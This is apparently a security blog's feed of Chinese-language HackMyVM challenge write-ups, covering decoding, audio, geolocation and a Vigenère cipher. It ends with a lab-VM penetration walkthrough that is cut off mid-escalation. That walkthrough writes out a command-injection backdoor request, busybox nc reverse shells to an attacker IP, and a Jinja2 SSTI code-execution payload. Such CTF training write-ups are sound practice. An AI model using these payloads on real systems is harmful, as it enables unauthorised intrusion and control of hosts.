00000160: 7633 4856 7766 5535 617a 356d 3435 4438  v3HVwfU5az5m45D8
00000170: 5450 7942 4237 4a78 5851 644c 5a79 4449  TPyBB7JxXQdLZyDI
00000180: 4962 7134 4738 6647 5655 746a 3346 396f  Ibq4G8fGVUtj3F9o
00000190: 6939 3664 3241 7a5a 7270 5962 3861 4779  i96d2AzZrpYb8aGy
000001a0: 4f4d 734c 6544 4132 7746 5853 6b4c 516f  OMsLeDA2wFXSkLQo
000001b0: 2d2d 3642 7359 367a 4f41 6773 504e 566b  --6BsY6zOAgsPNVk
000001c0: 6a72 4b35 6a57 5658 5975 7653 3455 3253  jrK5jWVXYuvS4U2S
000001d0: 6e73 4970 3347 7136 7653 3672 5076 3442  nsIp3Gq6vS6rPv4B
000001e0: 3471 7663 4245 352d 524a 5f5f 5a63 5067  4qvcBE5-RJ__ZcPg
000001f0: 2d65 5a4a 462d 4f4a 7a51 3944 6c4b 7052  -eZJF-OJzQ9DlKpR
00000200: 4530 7767 3364 7a52 4a57 6371 546c 7036  E0wg3dzRJWcqTlp6
00000210: 7131 4e62 6b39 5651 6e48 635f 6c55 67    q1Nbk9VQnHc_lUg
                                                                        
```

https://gchq.github.io/CyberChef/

![image-20250617112131776](https://7r1umphk.github.io/image/20250617112132131.webp)

```
HMV{DoNotStoreSensitiveDataHere}
```

sentence</description><guid isPermaLink="true">https://7r1UMPHK.github.io/post/Challenge%20039.html</guid><pubDate>Fri, 27 Jun 2025 09:30:19 +0000</pubDate></item><item><title>Challenge 038</title><link>https://7r1UMPHK.github.io/post/Challenge%20038.html</link><description>复习复的有点无聊，打几个Challenge吧

![image-20250616113539463](https://7r1umphk.github.io/image/20250616113547236.webp)

下载

```
┌──(kali㉿kali)-[/mnt/hgfs/gx]
└─$ ll 038.zip 
-rwxr-xr-x 1 kali kali 15093 Jun 15 23:36 038.zip
                                                                                                                                                                                   
┌──(kali㉿kali)-[/mnt/hgfs/gx]
└─$ unzip 038.zip 
Archive:  038.zip
  inflating: 038.mp3                 
                    
```

非常快速的唧唧歪歪，哈哈哈

慢放试试(audacity)，没有的自己下一个

https://www.audacityteam.org/

重放到大概0.2倍就可以听到它在说字母(效果器&gt;音高和速度&gt;变速并变调)

但是确实听不清它在说什么，导出去

因为我电脑下来语音转文本的模型，我就直接用了，你们可以丢给ai之类的

![image-20250616124822537](https://7r1umphk.github.io/image/20250616124822922.webp)

```
HMV{hacktheplanet}
```

sentence</description><guid isPermaLink="true">https://7r1UMPHK.github.io/post/Challenge%20038.html</guid><pubDate>Fri, 27 Jun 2025 09:30:16 +0000</pubDate></item><item><title>Challenge 036</title><link>https://7r1UMPHK.github.io/post/Challenge%20036.html</link><description>![image-20250614100556180](https://7r1umphk.github.io/image/20250614100556493.webp)

找BSSID，先下载

```
┌──(kali㉿kali)-[/mnt/hgfs/gx]
└─$ ll 036.zip                                   
-rwxr-xr-x 1 kali kali 1495216 Jun 13 22:06 036.zip
                                                                                                                                                                                   
┌──(kali㉿kali)-[/mnt/hgfs/gx]
└─$ unzip 036.zip 
Archive:  036.zip
 extracting: 036.png                 
                                                                                                                                                                                   
┌──(kali㉿kali)-[/mnt/hgfs/gx]
└─$ exiftool 036.png 
ExifTool Version Number         : 13.25
File Name                       : 036.png
Directory                       : .
File Size                       : 1495 kB
File Modification Date/Time     : 2023:08:24 12:20:50-04:00
File Access Date/Time           : 2025:06:13 22:06:26-04:00
File Inode Change Date/Time     : 2023:08:24 12:20:50-04:00
File Permissions                : -rwxr-xr-x
File Type                       : PNG
File Type Extension             : png
MIME Type                       : image/png
Image Width                     : 1153
Image Height                    : 721
Bit Depth                       : 8
Color Type                      : RGB
Compression                     : Deflate/Inflate
Filter                          : Adaptive
Interlace                       : Noninterlaced
SRGB Rendering                  : Perceptual
Gamma                           : 2.2
Pixels Per Unit X               : 3779
Pixels Per Unit Y               : 3779
Pixel Units                     : meters
Software                        : Greenshot
Image Size                      : 1153x721
Megapixels                      : 0.831
                
```

看看图

![036](https://7r1umphk.github.io/image/20250614100806952.webp)

google扫街启动

**识别关键标志**

su开头的，然后亚洲肤色，然后

![image-20250614101747240](https://7r1umphk.github.io/image/20250614101747390.webp)

这玩意应该在座的各位大学生都认识吧

阳光在线广场

（给我干的怀疑是在china了）

但是，这里有日文

![image-20250614101905083](https://7r1umphk.github.io/image/20250614101905268.webp)

SunLive（日文：サンリブ）

扫街扫街，一时半会找不到，google搜索一下吧

![image-20250614102419163](https://7r1umphk.github.io/image/20250614102419498.webp)

哈哈，有前辈的wp，我们还是不看了，但是他其他的可能都显示了

![image-20250614103211358](https://7r1umphk.github.io/image/20250614103211803.webp)

大概位置：ココカラファイン薬局もりつね店

找找吧

![image-20250614103315350](https://7r1umphk.github.io/image/20250614103316425.webp)

找到了

![image-20250614103343809](https://7r1umphk.github.io/image/20250614103344081.webp)

这里，然后我们要去找**Wi-Fi数据库**扒拉一下了

用 [wigle.net](https://www.google.com/url?sa=E&amp;q=https%3A%2F%2Fwigle.net%2F)

搜索一下： 1 Chome-11-25 Moritsune, Kokuraminami Ward, Kitakyushu, Fukuoka 802-0972日本
![image-20250614103934917](https://7r1umphk.github.io/image/20250614103935120.webp)

然后需要注册一下，不然啥都用不了

![image-20250614104212731](https://7r1umphk.github.io/image/20250614104212971.webp)

啊这，换个网站

我去，没个可以用的，看看前辈的wp吧

https://sec-fortress.github.io/posts/HackMyVM/posts/036.html

```
HMV{00:3A:9A:7B:5F:40}
```

sentence</description><guid isPermaLink="true">https://7r1UMPHK.github.io/post/Challenge%20036.html</guid><pubDate>Fri, 27 Jun 2025 09:30:13 +0000</pubDate></item><item><title>Challenge 014</title><link>https://7r1UMPHK.github.io/post/Challenge%20014.html</link><description># 1. 初步分析

**挑战链接:** https://hackmyvm.eu/challenges/challenge.php?c=014

![挑战图片](https://7r1umphk.github.io//20250518140930918.webp)

## 1. 初步分析

挑战页面非常直接地给出了任务：

```
Find the flag in the domain http://momo.hackmyvm.eu
```

这表明 Flag 隐藏在目标域名 `http://momo.hackmyvm.eu` 的某个位置。对于 Web 类型的挑战，常见的 Flag 隐藏地点包括：
*   HTML 源代码注释
*   特定的页面或文件路径
*   HTTP 响应头
*   `robots.txt` 文件
*   `.htaccess` 或其他服务器配置文件（如果可访问）
*   目录爆破发现的隐藏目录或文件

## 2. 寻找 Flag

根据 Web 安全测试的常见步骤，首先检查 `robots.txt` 文件是一个很好的起点，因为它通常会指示搜索引擎哪些路径不应该被索引，有时会意外泄露敏感信息或线索。

### 2.1 检查 robots.txt

使用 `curl` 命令（或直接在浏览器中访问）来获取 `http://momo.hackmyvm.eu/robots.txt` 的内容：

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx]
└─$ curl http://momo.hackmyvm.eu/robots.txt
HMV{robotized}
```

## 3. 获取 Flag 内容

`curl` 命令的输出直接返回了 Flag。`robots.txt` 文件中包含了 `HMV{robotized}`。

## 4. Flag

最终的 Flag 是：

```
HMV{robotized}
```
sentence</description><guid isPermaLink="true">https://7r1UMPHK.github.io/post/Challenge%20014.html</guid><pubDate>Fri, 27 Jun 2025 09:30:10 +0000</pubDate></item><item><title>Challenge 013</title><link>https://7r1UMPHK.github.io/post/Challenge%20013.html</link><description>**挑战链接:** https://hackmyvm.eu/challenges/challenge.php?c=013

![挑战图片](https://7r1umphk.github.io/image/20250518140039064.webp)

## 1. 初步分析

访问挑战页面，页面上显示了一段被 `&lt;pre&gt;` 标签包裹的文本：

```html
&lt;pre&gt; MXV{BNRNKWPCEUSEX} k:FLAG &lt;/pre&gt;
```

这段文本包含两部分：
1.  `MXV{BNRNKWPCEUSEX}`: 这看起来是一个加密后的 Flag 格式，其中 `MXV` 可能是加密文本的前缀，`BNRNKWPCEUSEX` 是密文。
2.  `k:FLAG`: 这强烈暗示了加密所使用的密钥 (key) 是字符串 'FLAG'。

结合常见的 CTF 题目类型，这种形式的密文和密钥提示通常指向古典密码，如凯撒密码、维吉尼亚密码等。考虑到提供了多字符密钥 'FLAG'，维吉尼亚密码 (Vigenère cipher) 是最有可能的加密方式。

## 2. 解密过程

为了获取原始 Flag，我们需要使用识别出的密钥对密文进行维吉尼亚解密。

### 2.1 识别加密类型及密钥

*   **加密类型**: 维吉尼亚密码 (Vigenère cipher)。
*   **密文**: `BNRNKWPCEUSEX` (取自 `MXV{BNRNKWPCEUSEX}` 中的花括号部分)。
*   **密钥**: `FLAG` (根据页面提示 `k:FLAG`)。

### 2.2 使用 CyberChef 进行解密

CyberChef 是一个非常方便的在线编解码工具，非常适合处理此类古典密码。

1.  打开 CyberChef。
2.  将密文 `BNRNKWPCEUSEX` 粘贴到 'Input' 框中。
    *   或者，可以将完整的字符串 `MXV{BNRNKWPCEUSEX}` 输入，然后观察解密结果是否包含可识别的 Flag 格式。根据您的截图，您输入的是完整的 `MXV{BNRNKWPCEUSEX}`。
3.  在 'Operations' 列表中搜索 'Vigenère Decode' 并将其拖拽到 'Recipe' 区域。
4.  在 'Vigenère Decode' 操作的 'Key' 字段中输入密钥 `FLAG`。

CyberChef 的操作界面和解密结果如下所示：

![1](https://7r1umphk.github.io/image/20250702100248579.webp)

从 CyberChef 的输出可以看到，当输入为 `MXV{BNRNKWPCEUSEX}` 且密钥为 `FLAG` 时，解密结果是 `HMV{VIGNERECYPHER}`。
这意味着原始 Flag 的前缀是 `HMV`，内容是 `VIGNERECYPHER`。

## 3. 获取 Flag 内容

通过 CyberChef 使用维吉尼亚解密，我们成功地将密文 `MXV{BNRNKWPCEUSEX}` 配合密钥 `FLAG` 解密为明文。

## 4. Flag

最终的 Flag 是：

```
HMV{VIGNERECYPHER}
```

---sentence</description><guid isPermaLink="true">https://7r1UMPHK.github.io/post/Challenge%20013.html</guid><pubDate>Fri, 27 Jun 2025 09:30:07 +0000</pubDate></item><item><title>eeeeeasy 靶机渗透测试Writeup</title><link>https://7r1UMPHK.github.io/post/eeeeeasy%20-ba-ji-shen-tou-ce-shi-Writeup.html</link><description>靶机名字: eeeeeasy（群友机器，可能后面会发布在hackmyvm）

哈，看这名字，是想说 '太简单啦' 还是 'eeee...easy?' 不管了，开干！

### 1. 信息收集 - 找到你了！

老规矩，先用 `arp-scan` 在内网里扫一圈，看看目标在哪儿。

```bash
┌──(kali㉿kali)-[~]
└─$ sudo arp-scan -l
[sudo] password for kali: 
Interface: eth0, type: EN10MB, MAC: 00:0c:29:af:40:3a, IPv4: 192.168.205.206
WARNING: Cannot open MAC/Vendor file ieee-oui.txt: Permission denied
WARNING: Cannot open MAC/Vendor file mac-vendor.txt: Permission denied
Starting arp-scan 1.10.0 with 256 hosts (https://github.com/royhills/arp-scan)
192.168.205.1   00:50:56:c0:00:08       (Unknown)
192.168.205.2   00:50:56:f4:ef:6f       (Unknown)
192.168.205.213 08:00:27:70:f3:fd       (Unknown)  # &lt;--- 目标出现！
192.168.205.254 00:50:56:f5:17:d6       (Unknown)

4 packets received by filter, 0 packets dropped by kernel
Ending arp-scan 1.10.0: 256 hosts scanned in 1.926 seconds (132.92 hosts/sec). 4 responded
```
目标IP是 `192.168.205.213`，祭出`nmap`大法，先来个全端口快速扫描。

```bash
┌──(kali㉿kali)-[~]
└─$ nmap -p- --min-rate 10000 192.168.205.213            
Starting Nmap 7.95 ( https://nmap.org ) at 2025-05-17 04:39 EDT
Nmap scan report for 192.168.205.213
Host is up (0.00021s latency).
Not shown: 65532 closed tcp ports (reset)
PORT    STATE SERVICE
22/tcp  open  ssh
80/tcp  open  http
443/tcp open  https
MAC Address: 08:00:27:70:F3:FD (PCS Systemtechnik/Oracle VirtualBox virtual NIC)

Nmap done: 1 IP address (1 host up) scanned in 1.08 seconds
```
开了22 (SSH), 80 (HTTP), 443 (HTTPS) 端口。再来个详细点的服务版本探测。

```bash
┌──(kali㉿kali)-[~]
└─$ nmap -p22,80,443 -sV 192.168.205.213
Starting Nmap 7.95 ( https://nmap.org ) at 2025-05-17 04:39 EDT
Nmap scan report for 192.168.205.213
Host is up (0.00029s latency).

PORT    STATE SERVICE  VERSION
22/tcp  open  ssh      OpenSSH 8.4p1 Debian 5+deb11u3 (protocol 2.0)
80/tcp  open  http     Apache httpd 2.4.62 ((Debian))
443/tcp open  ssl/http Apache httpd 2.4.62 ((Debian))
MAC Address: 08:00:27:70:F3:FD (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 12.53 seconds
```
SSH是OpenSSH 8.4p1，Web服务是Apache 2.4.62 (Debian)。看来突破口很可能在Web上。

### 2. Web渗透 - 藏得挺深啊！

先用`curl`看看80和443端口的首页是啥。

```bash
┌──(kali㉿kali)-[~]
└─$ curl -v http://192.168.205.213:80
*   Trying 192.168.205.213:80...
* Connected to 192.168.205.213 (192.168.205.213) port 80
* using HTTP/1.x
&gt; GET / HTTP/1.1
&gt; Host: 192.168.205.213
&gt; User-Agent: curl/8.13.0
&gt; Accept: */*
&gt; 
* Request completely sent off
&lt; HTTP/1.1 200 OK
&lt; Date: Sat, 17 May 2025 08:40:10 GMT
&lt; Server: Apache/2.4.62 (Debian)
&lt; Last-Modified: Sat, 12 Apr 2025 01:53:17 GMT
&lt; ETag: '6-6328b152a4f57'
&lt; Accept-Ranges: bytes
&lt; Content-Length: 6
&lt; Content-Type: text/html
&lt; 
index
* Connection #0 to host 192.168.205.213 left intact
                                                                                                                                                                                   
┌──(kali㉿kali)-[~]
└─$ curl -vk https://192.168.205.213:443
*   Trying 192.168.205.213:443...
* ALPN: curl offers h2,http/1.1
* TLSv1.3 (OUT), TLS handshake, Client hello (1):
* TLSv1.3 (IN), TLS handshake, Server hello (2):
* TLSv1.3 (IN), TLS change cipher, Change cipher spec (1):
* TLSv1.3 (IN), TLS handshake, Encrypted Extensions (8):
* TLSv1.3 (IN), TLS handshake, Certificate (11):
* TLSv1.3 (IN), TLS handshake, CERT verify (15):
* TLSv1.3 (IN), TLS handshake, Finished (20):
* TLSv1.3 (OUT), TLS change cipher, Change cipher spec (1):
* TLSv1.3 (OUT), TLS handshake, Finished (20):
* SSL connection using TLSv1.3 / TLS_AES_256_GCM_SHA384 / x25519 / RSASSA-PSS
* ALPN: server accepted http/1.1
* Server certificate:
*  subject: CN=PyCrt.PyCrt
*  start date: Apr  1 14:05:29 2025 GMT
*  expire date: Mar 30 14:05:29 2035 GMT
*  issuer: CN=PyCrt.PyCrt
*  SSL certificate verify result: self-signed certificate (18), continuing anyway.
*   Certificate level 0: Public key type RSA (2048/112 Bits/secBits), signed using sha256WithRSAEncryption
* Connected to 192.168.205.213 (192.168.205.213) port 443
* using HTTP/1.x
&gt; GET / HTTP/1.1
&gt; Host: 192.168.205.213
&gt; User-Agent: curl/8.13.0
&gt; Accept: */*
&gt; 
* Request completely sent off
* TLSv1.3 (IN), TLS handshake, Newsession Ticket (4):
* TLSv1.3 (IN), TLS handshake, Newsession Ticket (4):
&lt; HTTP/1.1 200 OK
&lt; Date: Sat, 17 May 2025 08:40:19 GMT
&lt; Server: Apache/2.4.62 (Debian)
&lt; Last-Modified: Sat, 12 Apr 2025 01:53:17 GMT
&lt; ETag: '6-6328b152a4f57'
&lt; Accept-Ranges: bytes
&lt; Content-Length: 6
&lt; Content-Type: text/html
&lt; 
index
* Connection #0 to host 192.168.205.213 left intact
```
80和443端口内容都是 'index'，HTTPS用的是自签名证书 `CN=PyCrt.PyCrt`。没啥信息，上目录爆破工具 `gobuster`。

```bash
┌──(kali㉿kali)-[~]
└─$ gobuster dir -u http://192.168.205.213:80 -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -x php,txt,html,zip  
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.205.213:80
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              php,txt,html,zip
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.html                (Status: 403) [Size: 280]
/index.html           (Status: 200) [Size: 6]
/.php                 (Status: 403) [Size: 280]
/hacker               (Status: 301) [Size: 319] [--&gt; http://192.168.205.213/hacker/] # &lt;--- 发现新大陆
Progress: 43164 / 1102800 (3.91%)^C
[!] Keyboard interrupt detected, terminating.
Progress: 43918 / 1102800 (3.98%)
===============================================================
Finished
===============================================================
```
扫出来一个 `/hacker/` 目录，有点意思。浏览器访问看看。

![image-20250517164328109](https://7r1umphk.github.io/image/20250517164328580.webp)

是个静态页面，继续对 `/hacker/` 目录进行爆破。

```bash
┌──(kali㉿kali)-[~]
└─$ gobuster dir -u http://192.168.205.213/hacker/ -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -x php,txt,html,zip
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.205.213/hacker/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              txt,html,zip,php
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/index.html           (Status: 200) [Size: 40821]
/.html                (Status: 403) [Size: 280]
/.php                 (Status: 403) [Size: 280]
/img                  (Status: 301) [Size: 323] [--&gt; http://192.168.205.213/hacker/img/]
/css                  (Status: 301) [Size: 323] [--&gt; http://192.168.205.213/hacker/css/]
/js                   (Status: 301) [Size: 322] [--&gt; http://192.168.205.213/hacker/js/]
Progress: 40053 / 1102800 (3.63%)^C
[!] Keyboard interrupt detected, terminating.
Progress: 42645 / 1102800 (3.87%)
===============================================================
Finished
===================================
```
爆破结果都是些常规目录，`index.html`, `img`, `css`, `js`。看来得去看看页面源码了，尤其是JS文件。
在浏览器中访问 `https://192.168.205.213/hacker/js/` ，看到一个叫`hacker.js`的JS文件

![image-20250517164504164](https://7r1umphk.github.io/image/20250517164504335.webp)

在 `hacker.js` 的底部发现了一段有意思的JavaScript代码：
```javascript
document.addEventListener('keydown', function (e) {
    if (e.ctrlKey &amp;&amp; e.shiftKey &amp;&amp; e.key === 'Z') {
        let cmd = prompt('è¯·è¾“å…¥è°ƒè¯•å‘½ä»¤:'); // 提示：请输入调试命令
        if (cmd) {
            fetch('./supercoool.php?cmd=' + encodeURIComponent(cmd))
                .then(res =&gt; res.text())
                .then(txt =&gt; {
                    alert('å‘½ä»¤è¾“å‡ºï¼š\n' + txt); // 提示：命令输出
                });
        }
    }
});
```
好家伙！这藏了个后门啊！当在 `https://192.168.205.213/hacker/` 页面按下 `Ctrl + Shift + Z` 组合键时，会弹出一个输入框，让你输入命令，然后通过 `supercoool.php` 这个文件以GET请求的`cmd`参数来执行。

直接用`curl`来利用这个后门，先试试执行`id`命令。

```bash
┌──(kali㉿kali)-[~]
└─$ curl -k 'https://192.168.205.213/hacker/supercoool.php?cmd=id'
&lt;pre&gt;uid=33(www-data) gid=33(www-data) groups=33(www-data)
&lt;/pre&gt;                                                                              
```
成功执行！当前用户是 `www-data`。那必须弹个shell回来了。

本地Kali开个`nc`监听：
```bash
┌──(kali㉿kali)-[~]
└─$ nc -lvnp 8888                       
listening on [any] 8888 ...
```
然后通过`curl`发送反弹shell的payload。靶机上有`busybox nc`，用它来反弹。

```bash
┌──(kali㉿kali)-[~]
└─$ curl -k 'https://192.168.205.213/hacker/supercoool.php?cmd=busybox+nc+192.168.205.206+8888+-e+/bin/bash'
```
回到`nc`监听窗口：
```bash
┌──(kali㉿kali)-[~]
└─$ nc -lvnp 8888                       
listening on [any] 8888 ...
connect to [192.168.205.206] from (UNKNOWN) [192.168.205.213] 53242
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```
成功拿到 `www-data` 的shell！

### 3. 权限提升 - www-data -&gt; qaq -&gt; root

#### 3.1 www-data -&gt; user.txt &amp; qaq

先来一套组合拳稳定一下shell：
```bash
script /dev/null -c bash
# Ctrl+Z 
stty raw -echo; fg
# (回车)
reset xterm  
export TERM=xterm  
export SHELL=/bin/bash  
stty rows 24 columns 80
```
尝试 `sudo -l`：
```bash
www-data@eeeeeasy:/var/www/html/hacker$ sudo -l

We trust you have received the usual lecture from the local System
Administrator. It usually boils down to these three things:

    #1) Respect the privacy of others.
    #2) Think before you type.
    #3) With great power comes great responsibility.

[sudo] password for www-data: 
sudo: a password is required
```
需要密码，此路不通。去 `/home` 目录看看有啥用户：
```bash
www-data@eeeeeasy:/var/www/html/hacker$ cd /home/
www-data@eeeeeasy:/home$ ls -al
total 16
drwxr-xr-x  4 root    root    4096 May 16 07:05 .
drwxr-xr-x 18 root    root    4096 Mar 18 20:37 ..
drwxr-xr-x  3 qaq     qaq     4096 May 16 11:04 qaq
drwxr-xr-x  2 welcome welcome 4096 May 16 11:06 welcome
```
有两个用户 `qaq` 和 `welcome`。先去 `welcome` 家看看有啥好东西。
```bash
www-data@eeeeeasy:/home$ cd welcome/
www-data@eeeeeasy:/home/welcome$ ls -al
total 32
drwxr-xr-x 2 welcome welcome 4096 May 16 11:06 .
drwxr-xr-x 4 root    root    4096 May 16 07:05 ..
-rw------- 1 welcome welcome   13 May 16 11:06 .bash_history
-rw-r--r-- 1 welcome welcome  220 Apr 11 22:27 .bash_logout
-rw-r--r-- 1 welcome welcome 3526 Apr 11 22:27 .bashrc
-rw-r--r-- 1 welcome welcome  807 Apr 11 22:27 .profile
-rw-r--r-- 1 root    root      19 May 16 10:48 .viminfo
-rw-r--r-- 1 root    root      44 May 16 11:02 user.txt # &lt;--- user flag!
www-data@eeeeeasy:/home/welcome$ cat user.txt 
flag{user-376760a7c735a606d4f8d8340bad4184}
```
直接拿到了 `user.txt`！看来权限设置有点松。

接下来看看能不能提到 `qaq` 或者 `root`。
检查SUID文件和定时任务：
```bash
www-data@eeeeeasy:/home/welcome$ find / -perm -4000 -type f 2&gt;/dev/null
/usr/bin/chsh
/usr/bin/chfn
/usr/bin/newgrp
/usr/bin/gpasswd
/usr/bin/mount
/usr/bin/su
/usr/bin/umount
/usr/bin/pkexec
/usr/bin/sudo
/usr/bin/passwd
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/eject/dmcrypt-get-device
/usr/lib/openssh/ssh-keysign
/usr/libexec/polkit-agent-helper-1
www-data@eeeeeasy:/home/welcome$ crontab -l
no crontab for www-data
```
SUID文件没啥特别的，定时任务也没有。
去 `/opt/` 目录瞅瞅：
```bash
www-data@eeeeeasy:/tmp$ cd /opt/
www-data@eeeeeasy:/opt$ ls -al
total 12
drwxr-xr-x  3 root root 4096 May 16 10:07 .
drwxr-xr-x 18 root root 4096 Mar 18 20:37 ..
drwxr-x---  4 qaq  qaq  4096 May 16 11:00 flask-app # &lt;--- 归属于qaq用户
```
发现一个 `/opt/flask-app` 目录，属于 `qaq` 用户。看看进程里有没有相关的。
```bash
www-data@eeeeeasy:/opt$ ps aux | grep 'flask'
qaq          555  0.0  1.3  35132 27836 ?        S    04:39   0:00 /opt/flask-app/venv/bin/python3 /opt/flask-app/app.py
qaq          556  0.1  1.3 182880 28364 ?        Sl   04:39   0:01 /opt/flask-app/venv/bin/python3 /opt/flask-app/app.py
www-data     773  0.0  0.0   3176   696 pts/0    S+   05:04   0:00 grep flask
```
果然，`qaq` 用户正在运行 `/opt/flask-app/app.py`。看看它监听了什么端口。
```bash
www-data@eeeeeasy:/opt$ ss -tulnp
Netid   State    Recv-Q   Send-Q     Local Address:Port     Peer Address:Port   
udp     UNCONN   0        0                0.0.0.0:68            0.0.0.0:*      
tcp     LISTEN   0        128              0.0.0.0:22            0.0.0.0:*      
tcp     LISTEN   0        128            127.0.0.1:5000          0.0.0.0:*  # &lt;--- Flask App
tcp     LISTEN   0        128                 [::]:22               [::]:*      
tcp     LISTEN   0        128                    *:443                 *:*      
tcp     LISTEN   0        128                    *:80                  *:*     
```
这个Flask应用监听在 `127.0.0.1:5000`。用`curl`访问一下。
```bash
www-data@eeeeeasy:/opt$ curl 127.0.0.1:5000

    &lt;html&gt;
        &lt;head&gt;&lt;title&gt;SurveyMaster - 填写问卷&lt;/title&gt;
&lt;style&gt;
    /* ... CSS styles ... */
&lt;/style&gt;
&lt;/head&gt;
        &lt;body&gt;
            &lt;div class='container'&gt;
                &lt;h1&gt;SurveyMaster&lt;/h1&gt;
                &lt;p&gt;提交你的问卷，分享你的想法！&lt;/p&gt;
                &lt;form action='/submit' method='POST'&gt;
                    &lt;input type='text' name='username' placeholder='你的名字' required&gt;
                    &lt;input type='text' name='question' placeholder='问卷问题' required&gt;
                    &lt;textarea name='answer' placeholder='你的答案' required&gt;&lt;/textarea&gt;
                    &lt;input type='submit' value='提交问卷'&gt;
                &lt;/form&gt;
            &lt;/div&gt;
        &lt;/body&gt;
    &lt;/html&gt;
```
是个问卷提交页面。Flask应用，常用的模板引擎是Jinja2，这就有SSTI的可能了。
尝试在POST请求的各个参数 (`username`, `question`, `answer`) 中插入 `{{7*7}}` 来测试SSTI。

```bash
www-data@eeeeeasy:/opt$ sh # 切换到sh方便多次执行curl
$ curl -X POST -d 'username={{7*7}}&amp;question=test&amp;answer=test' http://127.0.0.1:5000/submit
# ... (输出显示用户名为 {{7*7}}，没有 SSTI) ...
$ curl -X POST -d 'username=test&amp;question={{7*7}}&amp;answer=test' http://127.0.0.1:5000/submit
# ... (输出显示问题为 {{7*7}}，没有 SSTI) ...
$ curl -X POST -d 'username=test&amp;question=test&amp;answer={{7*7}}' http://127.0.0.1:5000/submit

        &lt;html&gt;
            &lt;head&gt;&lt;title&gt;SurveyMaster - 问卷提交&lt;/title&gt;
            &lt;!-- ... CSS ... --&gt;
            &lt;/head&gt;
            &lt;body&gt;
                &lt;div class='container'&gt;
                    &lt;h1&gt;问卷提交成功&lt;/h1&gt;
                    &lt;p&gt;提交者: test&lt;/p&gt;
                    &lt;p&gt;问题: test&lt;/p&gt;
                    &lt;p&gt;答案: 49&lt;/p&gt;  &lt;!-- bingo！ --&gt;
                    &lt;p&gt;&lt;a href='/preview/test'&gt;查看你的问卷&lt;/a&gt; | &lt;a href='/'&gt;继续填写&lt;/a&gt;&lt;/p&gt;
                &lt;/div&gt;
            &lt;/body&gt;
        &lt;/html&gt;
```
漂亮！当`answer`字段的值是 `{{7*7}}` 时，返回的页面中答案显示为 `49`。这明确地证明了 `answer` 字段存在SSTI漏洞！

构造SSTI payload来执行命令，获取`qaq`用户的权限。
```bash
$ curl -X POST -d 'username=test&amp;question=test&amp;answer={{ self.__init__.__globals__.__builtins__.__import__('os').popen('id').read() }}' http://127.0.0.1:5000/submit

        &lt;html&gt;
            &lt;!-- ... HTML structure ... --&gt;
            &lt;body&gt;
                &lt;div class='container'&gt;
                    &lt;h1&gt;问卷提交成功&lt;/h1&gt;
                    &lt;p&gt;提交者: test&lt;/p&gt;
                    &lt;p&gt;问题: test&lt;/p&gt;
                    &lt;p&gt;答案: uid=1001(qaq) gid=1001(qaq) groups=1001(qaq)  # &lt;--- 命令执行成功！
&lt;/p&gt;
                    &lt;p&gt;&lt;a href='/preview/test'&gt;查看你的问卷&lt;/a&gt; | &lt;a href='/'&gt;继续填写&lt;/a&gt;&lt;/p&gt;
                &lt;/div&gt;
            &lt;/body&gt;
        &lt;/html&gt;
```
成功以`qaq`用户身份执行了`id`命令。现在，弹个`qaq`用户的shell回来。

Kali上再次监听：
```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx]
└─$ nc -lvnp 8888
listening on [any] 8888 ...
```
通过SSTI发送反弹shell payload：
```bash
$ curl -X POST -d 'username=test&amp;question=test&amp;answer={{ self.__init__.__globals__.__builtins__.__import__('os').popen('busybox nc 192.168.205.206 8888 -e /bin/bash').read() }}' http://127.0.0.1:5000/submit
```
回到Kali的`nc`监听：
```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx]
└─$ nc -lvnp 8888
listening on [any] 8888 ...
connect to [192.168.205.206] from (UNKNOWN) [192.168.205.213] 42084
id
uid=1001(qaq) gid=1001(qaq) groups=1001(qaq)
```
成功拿到 `qaq` 用户的shell！

#### 3.2 qaq -&gt; root

再次稳定shell：
```bash
script /dev/null -c bash
# Ctrl+Z
stty raw -echo; fg
# (press enter)
reset xterm  
export TERM=xterm  
export SHELL=/bin/bash  
stty rows 24 columns 80
```
现在是 `qaq` 用户了，看看有什么`sudo`权限或者SUID程序可以利用。
```
qaq@eeeeeasy:~$ sudo -l
Matching Defaults entries for qaq on eeeeeasy:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User qaq may run the following commands on eeeeeasy:
    (ALL) NOPASSWD: /usr/bin/fastfetch
```

这里我们发现 `/usr/bin/fastfetch` 这个程序有点特殊。我们可以用 `sudo` 执行它
先看看 `fastfetch -h` 有没有什么可以利用的参数：

```bash
qaq@eeeeeasy:~$ sudo /usr/bin/fastfetch -h
Fastfetch is a neofetch-like tool for fetching system information and displaying them in a pretty way

Usage: fastfetch &lt;?options&gt;
# ... (大量帮助信息，我们主要关注能执行命令的) ...
Module specific options:
      --command-shell &lt;str&gt;                  Set the shell program to execute the command text
      --command-key &lt;str&gt;                    Set the module key to display
      --command-text &lt;str&gt;                   Set the command text to be executed # &lt;--- 这个看起来很危险！
# ... (更多帮助信息) ...
```
